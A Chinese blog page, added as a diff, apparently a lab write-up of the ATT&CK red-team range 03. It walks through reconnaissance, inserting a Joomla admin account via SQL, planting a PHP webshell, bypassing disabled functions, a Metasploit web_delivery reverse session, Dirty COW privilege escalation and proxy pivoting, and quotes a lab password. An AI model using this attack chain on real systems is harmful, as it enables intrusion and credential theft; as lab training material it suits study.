@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.0.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"syst1m.top","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.12.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="基本信息本次测试为黑盒测试，所以所有主机都为挂起状态，且账号都默认已经登录 已知出网主机为centos主机 将centos出网网卡和kali攻击机网卡都设置为桥接复制物理网络模式 其它网卡都默认vmnet2模式，添加vmnet2网卡">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ATT&amp;CK红队实战靶场03">
+<meta property="og:url" content="https://syst1m.top/2022/07/23/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA03/index.html">
+<meta property="og:site_name" content="Syst1m">
+<meta property="og:description" content="基本信息本次测试为黑盒测试，所以所有主机都为挂起状态，且账号都默认已经登录 已知出网主机为centos主机 将centos出网网卡和kali攻击机网卡都设置为桥接复制物理网络模式 其它网卡都默认vmnet2模式，添加vmnet2网卡">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207231503267.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20191223205755-d65c291e-2583-1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207231506534.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207231508278.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207231540227.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207231553270.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207231602861.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207231604877.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207231605901.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207231612220.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207231622756.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207231623633.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207231627384.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207231633717.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207231635473.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207231709238.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207231715213.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207231716993.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207231717581.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207231722236.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207231735159.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207231737750.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207232329857.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20191223210200-68a25aaa-2584-1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207232347136.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207232348457.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207232354309.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207232357963.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207232358817.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207240015422.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207240017481.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207240020674.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207240021466.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207240026805.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207240046322.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207240045848.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207240048629.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207240104316.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207240116897.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207240119461.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207240131876.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207240200277.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207240245860.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207240245938.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207240242645.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207240248971.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207240253602.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207240308139.png">
+<meta property="article:published_time" content="2022-07-23T06:41:46.000Z">
+<meta property="article:modified_time" content="2022-07-23T19:10:29.038Z">
+<meta property="article:author" content="Syst1m">
+<meta property="article:tag" content="ATT&amp;CK">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/chencicici/images/main/202207231503267.png">
+
+
+<link rel="canonical" href="https://syst1m.top/2022/07/23/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA03/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://syst1m.top/2022/07/23/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA03/","path":"2022/07/23/ATT-CK红队实战靶场03/","title":"ATT&CK红队实战靶场03"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>ATT&CK红队实战靶场03 | Syst1m</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="Syst1m" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Syst1m</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="nav-number">1.</span> <span class="nav-text">基本信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8B%93%E6%89%91%E5%9B%BE"><span class="nav-number">2.</span> <span class="nav-text">拓扑图</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="nav-number">3.</span> <span class="nav-text">外网打点</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">3.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E6%89%93%E7%82%B9"><span class="nav-number">3.2.</span> <span class="nav-text">web打点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.3.</span> <span class="nav-text">提权</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="nav-number">4.</span> <span class="nav-text">内网渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%90%86"><span class="nav-number">4.1.</span> <span class="nav-text">代理</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Syst1m"
+      src="/images/IMG_0010.JPG">
+  <!--
+  <p class="site-author-name" itemprop="name">Syst1m</p>
+  -->
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">49</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">58</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/chencicici" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;chencicici" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1343369483@qq.com" title="E-Mail → mailto:1343369483@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.uodrad.top/" title="https:&#x2F;&#x2F;www.uodrad.top&#x2F;" rel="noopener" target="_blank">uodrad</a>
+        </li>
+    </ul>
+  </div>
+
+
+       <!--网易云插件-->
+      <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1933503036&auto=0&height=66">
+      </iframe>
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/chencicici" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://syst1m.top/2022/07/23/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA03/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/IMG_0010.JPG">
+      <meta itemprop="name" content="Syst1m">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Syst1m">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="ATT&CK红队实战靶场03 | Syst1m">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ATT&CK红队实战靶场03
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-07-23 14:41:46" itemprop="dateCreated datePublished" datetime="2022-07-23T14:41:46+08:00">2022-07-23</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-07-24 03:10:29" itemprop="dateModified" datetime="2022-07-24T03:10:29+08:00">2022-07-24</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%89%93%E9%9D%B6/" itemprop="url" rel="index"><span itemprop="name">打靶</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>本次测试为黑盒测试，所以所有主机都为挂起状态，且账号都默认已经登录</p>
+<p>已知出网主机为centos主机</p>
+<p>将centos出网网卡和kali攻击机网卡都设置为桥接复制物理网络模式</p>
+<p>其它网卡都默认vmnet2模式，添加vmnet2网卡</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231503267.png"></p>
+<p>开启centos后需要重新获取一次ip eth0网卡为我们复制的物理网络</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dhclient -r</span><br><span class="line">dhclient</span><br></pre></td></tr></table></figure>
+
+<h1 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h1><p>ip有出入</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191223205755-d65c291e-2583-1.png" alt="img"></p>
+<h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap确定目标ip</p>
+<img src="https://raw.githubusercontent.com/chencicici/images/main/202207231506534.png" style="zoom:50%;" />
+
+
+
+<p>进一步扫描端口</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231508278.png"></p>
+<p>目标为ubuntu16.04.1</p>
+<p>22端口存在ssh，可以爆破</p>
+<p>80端口web服务</p>
+<p>3306端口mysql数据库，可以爆破</p>
+<h2 id="web打点"><a href="#web打点" class="headerlink" title="web打点"></a>web打点</h2><p>访问网站，用插件得到cms信息 nginx+php+joomla</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231540227.png"></p>
+<p>使用joomscan工具扫描，没有漏洞但是知道了版本为3.9.12</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan -u http://192.168.31.54</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231553270.png"></p>
+<p>扫出了后台和一个配置文件</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231602861.png"></p>
+<img src="https://raw.githubusercontent.com/chencicici/images/main/202207231604877.png" style="zoom:50%;" />
+
+<p>得到mysql密码和绝对路径</p>
+<img src="https://raw.githubusercontent.com/chencicici/images/main/202207231605901.png" style="zoom:50%;" />
+
+
+
+<p>连接数据库</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231612220.png"></p>
+<p>拿到密码密文，解不出来</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231622756.png"></p>
+<p>查阅官方文档发现可以添加一个管理员账号 <a target="_blank" rel="noopener" href="https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn">https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO am2zu_users (name, username, password, params, registerDate, lastvisitDate, lastResetTime) VALUES (&#x27;Administrator2&#x27;, &#x27;admin123&#x27;, &#x27;433903e0a9d6a712e00251e44d29bf87:UJ0b9J5fufL3FKfCc0TLsYJBh2PFULvT&#x27;, &#x27;&#x27;, NOW(), NOW(), NOW()); INSERT INTO am2zu_user_usergroup_map (user_id,group_id) VALUES (LAST_INSERT_ID(),&#x27;8&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>执行sql语句添加账号密码admin123&#x2F;admin</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231623633.png"></p>
+<p>登录后台后添加.php后缀白名单</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231627384.png"></p>
+<p>在在Extensions -&gt; Templates -&gt; Templates可以编辑模板文件</p>
+<p>创建一个新的php文件用来写马</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231633717.png"></p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231635473.png"></p>
+<p>使用蚁剑连接需要注意关闭蚁剑的代理</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231709238.png"></p>
+<p>无法执行命令</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231715213.png"></p>
+<p>发现disbale_funcions禁用了函数</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231716993.png"></p>
+<p>通过蚁剑插件去绕过</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231717581.png"></p>
+<p>查看ip，发现不对劲，我们访问的ip明明是192.168.31.54，怎么这里是192.168.93.120，应该是使用了nginx反向代理</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231722236.png"></p>
+<p>上线到msf上做一个内网扫描，使用传统的生产后门再上传太麻烦了，这里使用msf本地起一个后门</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br></pre></td></tr></table></figure>
+
+<p>设置目标为linux</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231735159.png"></p>
+<p>然后将生成的命令复制到shell中执行</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231737750.png"></p>
+<p>但是没反弹成功，一开始我觉得是没有执行权限，于是到&#x2F;tmp目录下去执行，还是没有反弹成功，应该跟反向代理有关。我们访问的流量是从centos转发给ubuntu，而且我们不能直接访问ubuntu，不在一个网段，我们的流量是通过centos转发的，拿到的shell是ubuntu的</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207232329857.png"></p>
+<p>但是执行反弹msf的时候去通过去下载kali上的后门执行，而ubuntu和kali不在一个网段所以没法访问，如果是外网，kali和ubuntu都在外网且ubuntu出网的话是可以反弹的，但是这里是内网自己搭建的环境</p>
+<p>所以这台ubuntu的机器，提不提权已经无所谓了，根据我们拿到的信息，我们要拿到centos的shell才能继续下一步。</p>
+<p>继续往下,也没有找到关键信息，找了一下其他师傅的文章，说是存在&#x2F;tmp&#x2F;mysql&#x2F;test.txt，但我这里却没有，我上靶机看确实也没有，不太懂为什么,借用一张其他师傅的图</p>
+<p>wwwuser&#x2F;wwwuser_123Aqx</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191223210200-68a25aaa-2584-1.png" alt="img"></p>
+<p>ssh连接centos的时候报错</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207232347136.png"></p>
+<p>之所以报错是因为OpenSSH 7.0以后的版本不再支持ssh-dss (DSA)算法，解决方法是增加选项-oHostKeyAlgorithms&#x3D;+ssh-dss,即可成功解决</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -oHostKeyAlgorithms=+ssh-dss  wwwuser@192.168.31.54</span><br></pre></td></tr></table></figure>
+
+<p>成功连接</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207232348457.png"></p>
+<p>使用上面反弹msf的方法，将shell上线到msf</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207232354309.png"></p>
+<p>在tmp目录下执行</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207232357963.png"></p>
+<p>msf收到会话</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207232358817.png"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>linux 提权三板斧 内核、sudo -l、root权限命令</p>
+<p>尝试了sudo -l和root权限都无果，msf也提不动，查看内核版本符合脏牛，尝试内核提权</p>
+<p>把提权文件传上去编译</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240015422.png"></p>
+<p>切换用户</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240017481.png"></p>
+<p>在使用此用户运行刚刚上线msf的payload，或者直接运行tmp目录下的后门，获得一个root权限的会话</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240020674.png"></p>
+<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p>查看ip发现有两个网段</p>
+<img src="https://raw.githubusercontent.com/chencicici/images/main/202207240021466.png" style="zoom:50%;" />
+
+
+
+<p>添加路由，将msf代理进内网，再起一个反向代理方便使用别的工具</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240026805.png"></p>
+<p>proxychains添加一个代理</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>
+
+<p>![image-20220724002827926](&#x2F;Users&#x2F;chenci&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220724002827926.png)</p>
+<p>用nmap扫描存活主机和端口，要注意的是prxychains代理不了icmp流量，所以不能使用ping，只能用tcp去扫描</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240046322.png"></p>
+<p>也可以用msf自带的模块去扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 扫描存活主机</span></span><br><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br></pre></td></tr></table></figure>
+
+<p>扫出三台存活主机</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240045848.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">扫描端口</span><br><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240048629.png"></p>
+<p>nmap扫描的精确一点</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240104316.png"></p>
+<p>三台主机都为windows，10开启了53端口，推测为域控，20开启了1433 mssql，30和其余两台都存在smb服务，尝试永恒之蓝都不存在</p>
